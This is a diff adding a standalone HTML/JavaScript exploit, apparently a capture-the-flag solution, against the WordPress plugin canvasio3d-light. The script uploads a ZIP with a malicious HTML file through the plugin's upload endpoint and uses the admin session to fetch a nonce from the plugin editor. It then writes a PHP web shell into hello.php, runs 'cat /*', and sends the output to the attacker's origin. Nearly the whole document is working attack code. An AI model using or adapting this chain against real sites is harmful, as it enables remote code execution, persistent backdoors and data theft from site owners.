@@ -1,0 +1,59 @@
+<form action="" enctype="multipart/form-data"
+    target="_blank" method="post">
+    <input type="text" name="set" value="3GhaOsT7">
+    <input type="text" name="uploadType" value="x">
+    <input type="text" name="post_ID" value="x">
+    <input type="file" name="file">
+</form>
+
+<script src="https://unpkg.com/jszip@3.10.1/dist/jszip.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+
+<script>
+    const TARGET = "http://localhost:8080"
+    const zip = new JSZip();
+    form = document.querySelector("form")
+    form.action = TARGET+"/wp-content/plugins/canvasio3d-light/inc/caData.inc.php"
+
+    zip.file("foo.glb", "x");
+    zip.file("bangorkandulu.html", `
+<script>
+u = "/wp-admin/plugin-editor.php"
+p = "file=hello.php&plugin=hello.php"
+var x = new XMLHttpRequest();
+var r=0
+x.open('GET',u+"?"+ p,1);
+x.send(null);
+const sleep = (ms) =>new Promise(res=>setTimeout(res, ms))
+
+x.onreadystatechange = async function() {
+    if (x.readyState === 4 && r != 1) {
+        n = /name="nonce" value="(.*)" \\/><input/.exec(x.responseText)[1]
+        x.open("POST", u, 1)
+        x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        x.send(p + "&nonce="  + n + "&newcontent=<?=system($_GET['x'])?>")
+        r = 1
+        await sleep(1000)
+        const w = open('/wp-content/plugins/hello.php?x=cat /*')
+        await sleep(1000)
+        document.location = "${origin}?flag="+encodeURI(w.document.body.innerHTML)
+    }
+}
+<\/script>
+    `);
+
+    zip.generateAsync({
+        type: "blob",
+    }).then((blob) => {
+        const filename = "x.zip"
+        var fileInput = document.querySelector("input[name='file']");
+        var file = new File([blob], filename);
+        var dt = new DataTransfer()
+        dt.items.add(file)
+        fileInput.files = dt.files;
+        form.submit()
+    })
+    setTimeout(async()=>{
+        open(TARGET+"/wp-content/uploads/2024/08/bangorkandulu.html")
+    }, 1000)
+</script>
